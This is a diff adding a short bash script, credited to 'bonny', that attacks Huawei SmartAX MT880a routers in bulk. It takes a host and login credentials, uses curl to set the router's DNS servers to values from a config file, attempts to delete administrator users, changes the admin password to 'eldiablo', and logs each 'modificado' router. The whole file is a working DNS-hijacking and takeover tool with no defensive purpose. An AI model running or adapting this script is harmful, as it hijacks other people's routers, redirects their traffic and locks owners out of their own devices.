@@ -1,0 +1,23 @@
+#!/bin/bash
+
+##########################
+# by bonny               #
+##########################
+# CONFIG
+source configs/changers.cfg
+HOSTNAME="$1"
+USERNAME="$2"
+PASSWORD="$3"
+PASSWD="eldiablo"
+###########################
+
+${CURL} -u "$USERNAME:$PASSWORD" -d "Lan_DHCP=00000000&sysPoolStartingAddr=192.168.1.2&sysPoolCount=250" "http://$HOSTNAME/Forms/rpLanDHCP_1" -d "sysPriDNSAddr=$DNS1&sysSecDNSAddr=$DNS2" "http://$HOSTNAME/Forms/rpLanDHCP_1" 1>/dev/null 2>/dev/null
+for i in `${CURL} -u "$USERNAME:$PASSWORD" "http://$HOSTNAME/rpSysAdmin.html" | grep -i 'NAME="Sysadmin_username"' | sed -e 's?^.* VALUE="??' -e 's?".*$??'`; do
+	if [ $i ]; then
+		${CURL} -u "$USERNAME:$PASSWORD" "UserDelFlag=1" "http://$HOSTNAME/Forms/rpSysAdmin" 1>/dev/null 2>/dev/null
+	fi
+done
+${CURL} -u "$USERNAME:$PASSWORD" -d "sysAdminOldPasswd=$PASSWORD&sysAdminNewPasswd=$PASSWD&sysAdminConfirmPasswd=$PASSWD" "http://$HOSTNAME/Forms/rpSysAdmin" 1>/dev/null 2>/dev/null
+
+echo "[+] modificado, http://${HOSTNAME} ${USERNAME}:${PASSWORD} [HUAWEI SmartAX MT880a]"
+echo "http://${HOSTNAME} (${USERNAME}:${PASSWORD} => ${PASSWD}) [HUAWEI SmartAX MT880a]" >> logs/modificados.log
